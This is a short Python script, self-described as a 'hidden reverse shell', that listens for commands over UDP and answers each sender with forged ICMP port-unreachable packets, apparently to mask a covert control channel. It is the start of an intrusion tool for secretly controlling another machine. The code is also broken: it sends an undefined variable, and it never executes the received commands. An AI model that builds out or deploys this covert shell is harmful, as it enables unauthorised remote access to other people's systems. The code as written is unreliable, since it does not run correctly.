import socket
import struct
import argparse

parser = argparse.ArgumentParser(description="Hidden reverse shell")
parser.add_argument('port', type=int, help='port to listen on')
args = parser.parse_args()

UDP_IP = "127.0.0.1"
UDP_PORT = args.port
ICMP_CODE = 1

#socket to receive commands from
recsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
recsock.bind((UDP_IP, UDP_PORT))

# socket used to send fake ICMP messages
fakesock = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)

while True:
    data, addr = recsock.recvfrom(1024)
    icmp = struct.pack('bbHi', 3, 3, 0xfcfc, 0)
    print(icmp)
    fakesock.sendto(header, addr)

    print("received message: ", data)

